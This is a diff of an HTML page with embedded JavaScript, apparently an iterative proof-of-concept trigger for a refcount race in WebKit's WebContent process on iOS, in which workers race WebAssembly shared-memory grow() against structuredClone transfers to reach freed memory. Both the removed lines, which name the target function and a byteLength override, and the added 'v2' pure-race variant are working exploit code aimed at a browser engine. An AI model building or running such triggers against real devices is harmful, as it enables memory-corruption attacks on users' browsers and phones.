@@ -3,14 +3,14 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>P2 Deterministic Trigger</title>
+<title>P2 Deterministic Trigger v2</title>
 <style>
 body { background:#000; color:#0f0; font-family:monospace; font-size:12px; margin:0; padding:8px; }
 #log { white-space:pre-wrap; word-break:break-all; }
 </style>
 </head>
 <body>
-<div id="log">P2 trigger loading...</div>
+<div id="log">P2 v2 loading...</div>
 <script>
 (function(){
 "use strict";
@@ -27,19 +27,13 @@ document.addEventListener('visibilitychange', function() {
   if(document.hidden) log('!!! PAGE HIDDEN — RUN DEAD !!!');
 });
 
-// P2: deterministic WASM-grow refcount race trigger
-// Target: iOS 27.0.1 WebKit.WebContent
-// Bug: ArrayBuffer::refreshAfterWasmMemoryGrow(Memory*) — refcount race during grow
-// Signature: x2=x13=0x80000000 (INT32_MIN wraparound)
-
-log('P2: building shared WASM memory...');
+log('P2 v2: building shared WASM memory...');
 
 var SHARED_MEM = new WebAssembly.Memory({initial:1, maximum:128, shared:true});
-var view = new Uint8Array(SHARED_MEM.buffer);
 
-log('P2: memory built, byteLength=' + SHARED_MEM.buffer.byteLength);
+log('P2 v2: memory built, byteLength=' + SHARED_MEM.buffer.byteLength);
 
-// Worker: hammers grow() to trigger refreshAfterWasmMemoryGrow race
+// Grow worker: hammers mem.grow() to trigger refreshAfterWasmMemoryGrow race
 var growSrc = [
   'onmessage = function(e) {',
   '  var mem = e.data;',
@@ -60,8 +54,8 @@ var growSrc = [
   '};'
 ].join('\n');
 
-// Worker: structuredClone with transfer + byteLength getter override
-// This is the deterministic trigger — fires the refcount race
+// Clone worker: structuredClone with transfer — races against grow
+// No Object.defineProperty — pure race between transfer and grow
 var cloneSrc = [
   'onmessage = function(e) {',
   '  var mem = e.data;',
@@ -70,12 +64,9 @@ var cloneSrc = [
   '  function clone() {',
   '    try {',
   '      var ab = mem.buffer;',
-  '      // Override byteLength to return huge value — triggers INT32_MIN wraparound',
-  '      Object.defineProperty(ab, "byteLength", {',
-  '        get: function() { return 0x7fffffff; },',
-  '        configurable: true',
-  '      });',
   '      var ta = new Uint8Array(ab);',
+  '      // Transfer detaches ab — grow reallocates backing store',
+  '      // If they overlap: cloned ArrayBufferContents points to freed memory',
   '      structuredClone(ta, {transfer: [ab]});',
   '      n++;',
   '      if(n % 10 === 0) postMessage({type:"clone", n:n});',
@@ -108,18 +99,17 @@ cloneWorker.onmessage = function(e) {
   if(e.data.type === 'cloneerr') log('CLONE ERROR: ' + e.data.msg);
 };
 
-log('P2: spawning workers...');
+log('P2 v2: spawning workers...');
 
 growWorker.postMessage(SHARED_MEM);
 cloneWorker.postMessage(SHARED_MEM);
 
-log('P2: workers spawned, waiting for race...');
+log('P2 v2: workers spawned, waiting for race...');
 
-// Main thread: monitor for crash
-// If we get here without crashing after 30s, the race didn't fire
+// Monitor for crash — if we get here after 30s, the race didn't fire
 setTimeout(function() {
-  log('P2: 30s elapsed, no crash — race did not fire');
-  log('P2: check Analytics for WebKit.WebContent crash logs');
+  log('P2 v2: 30s elapsed, no crash — race did not fire');
+  log('P2 v2: check Analytics for WebKit.WebContent crash logs');
 }, 30000);
 
 })();
